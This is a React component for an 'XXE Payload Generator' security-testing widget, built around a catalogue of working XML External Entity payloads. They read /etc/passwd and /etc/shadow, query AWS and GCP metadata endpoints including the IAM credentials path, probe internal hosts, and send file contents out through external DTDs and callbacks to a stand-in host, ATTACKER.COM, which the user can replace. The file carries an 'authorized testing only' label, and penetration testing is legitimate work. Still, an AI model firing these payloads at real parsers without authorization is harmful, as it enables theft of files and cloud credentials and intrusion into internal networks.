import React from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCode, faCopy, faCheckCircle, faFileCode } from '@fortawesome/free-solid-svg-icons';

export type XxePayloadGeneratorData = {
  category?: XxeCategory;
  selectedPayload?: string;
  customTarget?: string;
  output?: string;
  copiedPayload?: string;
};

export type XxeCategory = 'basic' | 'file-read' | 'ssrf' | 'oob' | 'blind' | 'parameter-entity';

type Props = {
  data: XxePayloadGeneratorData | undefined;
  onChange: (data: XxePayloadGeneratorData) => void;
};

const xxePayloads: Record<XxeCategory, { name: string; payload: string; description: string }[]> = {
  'basic': [
    {
      name: 'Basic XXE',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "XXE Test Successful">
]>
<root>&xxe;</root>`,
      description: 'Simple entity expansion test'
    },
    {
      name: 'XML Declaration Only',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Minimal XXE payload'
    }
  ],
  'file-read': [
    {
      name: 'Read /etc/passwd (Linux)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Read Linux password file'
    },
    {
      name: 'Read /etc/shadow (Linux)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<foo>&xxe;</foo>`,
      description: 'Attempt to read shadow file (requires root)'
    },
    {
      name: 'Read Windows hosts',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>`,
      description: 'Read Windows hosts file'
    },
    {
      name: 'Read AWS Metadata',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>`,
      description: 'AWS instance metadata (SSRF + XXE)'
    },
    {
      name: 'PHP Wrapper Base64',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Base64 encode file contents (PHP)'
    }
  ],
  'ssrf': [
    {
      name: 'Internal Service Probe',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/">
]>
<foo>&xxe;</foo>`,
      description: 'Probe internal services'
    },
    {
      name: 'Internal Network Scan',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>`,
      description: 'Scan internal network'
    },
    {
      name: 'Cloud Metadata AWS',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,
      description: 'AWS metadata endpoint'
    },
    {
      name: 'Cloud Metadata GCP',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<foo>&xxe;</foo>`,
      description: 'GCP metadata endpoint'
    }
  ],
  'oob': [
    {
      name: 'OOB Data Exfiltration',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.COM/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>`,
      description: 'Out-of-band exfiltration via external DTD'
    },
    {
      name: 'OOB via FTP',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>`,
      description: 'Exfiltrate via FTP (external DTD required)'
    },
    {
      name: 'DNS Exfiltration',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.ATTACKER.COM/">
]>
<foo>&xxe;</foo>`,
      description: 'Trigger DNS lookup for confirmation'
    }
  ],
  'blind': [
    {
      name: 'Blind XXE Detection',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.COM/xxe-test">
  %xxe;
]>
<foo>test</foo>`,
      description: 'Detect blind XXE via callback'
    },
    {
      name: 'Error-based Blind',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>`,
      description: 'Extract data via error messages'
    }
  ],
  'parameter-entity': [
    {
      name: 'Parameter Entity',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % param "<!ENTITY exfil SYSTEM 'http://ATTACKER.COM/?data=%xxe;'>">
  %param;
]>
<foo>&exfil;</foo>`,
      description: 'Parameter entity for indirect access'
    },
    {
      name: 'Nested Parameter Entity',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY % b SYSTEM 'http://ATTACKER.COM/evil.dtd'>">
  %a;
  %b;
]>
<foo>test</foo>`,
      description: 'Nested parameter entities'
    }
  ]
};

const categories: { id: XxeCategory; label: string; icon: string }[] = [
  { id: 'basic', label: 'Basic', icon: 'B' },
  { id: 'file-read', label: 'File Read', icon: 'F' },
  { id: 'ssrf', label: 'SSRF', icon: 'S' },
  { id: 'oob', label: 'Out-of-Band', icon: 'O' },
  { id: 'blind', label: 'Blind', icon: 'L' },
  { id: 'parameter-entity', label: 'Parameter', icon: 'P' }
];

const XxePayloadGenerator: React.FC<Props> = ({ data, onChange }) => {
  const category = data?.category ?? 'basic';
  const selectedPayload = data?.selectedPayload ?? '';
  const customTarget = data?.customTarget ?? 'ATTACKER.COM';
  const output = data?.output ?? '';
  const [copiedPayload, setCopiedPayload] = React.useState<string | null>(null);

  const payloads = xxePayloads[category];

  const handleSelectPayload = (payloadName: string) => {
    const payload = payloads.find(p => p.name === payloadName);
    if (payload) {
      const processedPayload = payload.payload.replace(/ATTACKER\.COM/g, customTarget);
      onChange({ ...data, selectedPayload: payloadName, output: processedPayload });
    }
  };

  const handleTargetChange = (target: string) => {
    onChange({ ...data, customTarget: target });
    if (selectedPayload) {
      const payload = payloads.find(p => p.name === selectedPayload);
      if (payload) {
        const processedPayload = payload.payload.replace(/ATTACKER\.COM/g, target);
        onChange({ ...data, customTarget: target, output: processedPayload });
      }
    }
  };

  const handleCopy = async (text: string, name: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedPayload(name);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">XXE Payload Generator</div>
        <div className="flex gap-2">
          {output && (
            <button
              onClick={() => handleCopy(output, 'output')}
              className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
            >
              <FontAwesomeIcon icon={copiedPayload === 'output' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
              Copy
            </button>
          )}
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Generates XXE (XML External Entity) payloads for security testing.
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <div className="text-[10px] text-slate-500 mb-1">Callback Domain (for OOB)</div>
        <input
          type="text"
          value={customTarget}
          onChange={(e) => handleTargetChange(e.target.value)}
          placeholder="your-server.com"
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-red-500"
        />
      </div>

      <div className="mb-3">
        <div className="text-[10px] text-slate-500 mb-2">Category</div>
        <div className="grid grid-cols-3 gap-1">
          {categories.map((cat) => (
            <button
              key={cat.id}
              onClick={() => onChange({ ...data, category: cat.id, selectedPayload: '', output: '' })}
              className={`px-2 py-1 rounded text-[10px] font-medium transition-colors border ${
                category === cat.id
                  ? 'bg-red-600/20 border-red-500/50 text-red-300'
                  : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-slate-500'
              }`}
            >
              {cat.label}
            </button>
          ))}
        </div>
      </div>

      <div className="mb-3">
        <div className="text-[10px] text-slate-500 mb-2">Payloads</div>
        <div className="space-y-1 max-h-28 overflow-y-auto">
          {payloads.map((payload) => (
            <button
              key={payload.name}
              onClick={() => handleSelectPayload(payload.name)}
              className={`w-full text-left px-2 py-1.5 rounded text-[10px] transition-colors flex items-center justify-between border ${
                selectedPayload === payload.name
                  ? 'bg-red-900/30 border-red-500/50 text-slate-200'
                  : 'bg-slate-800/50 text-slate-300 hover:bg-slate-700 border-slate-700'
              }`}
            >
              <span>{payload.name}</span>
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  handleCopy(payload.payload.replace(/ATTACKER\.COM/g, customTarget), payload.name);
                }}
                className="text-[9px] text-slate-500 hover:text-slate-300"
              >
                <FontAwesomeIcon
                  icon={copiedPayload === payload.name ? faCheckCircle : faCopy}
                  className="w-2.5 h-2.5"
                />
              </button>
            </button>
          ))}
        </div>
      </div>

      {output && (
        <div className="flex-1 min-h-0 flex flex-col">
          <div className="flex items-center justify-between mb-1">
            <div className="text-[10px] text-slate-500 flex items-center gap-2">
              <FontAwesomeIcon icon={faFileCode} className="w-2.5 h-2.5" />
              Generated Payload
            </div>
          </div>
          <pre className="flex-1 overflow-y-auto p-2 bg-black/50 border border-slate-700 rounded text-green-400 text-[10px] font-mono whitespace-pre-wrap break-all">
            {output}
          </pre>
          {selectedPayload && (
            <div className="text-[10px] text-slate-500 mt-1">
              {payloads.find(p => p.name === selectedPayload)?.description}
            </div>
          )}
        </div>
      )}

      {!output && (
        <div className="flex-1 flex items-center justify-center">
          <div className="text-[11px] text-slate-500 text-center py-4">
            Select a payload to generate.
          </div>
        </div>
      )}

      <div className="text-[10px] text-slate-500 space-y-1 border-t border-slate-700 pt-2 mt-2">
        <div><strong>XXE:</strong> XML External Entity injection</div>
        <div><strong>Use:</strong> Test XML parsers for entity expansion vulnerabilities</div>
        <div className="text-red-400">For authorized security testing only!</div>
      </div>
    </div>
  );
};

export class XxePayloadGeneratorTool {
  static Component = XxePayloadGenerator;
}
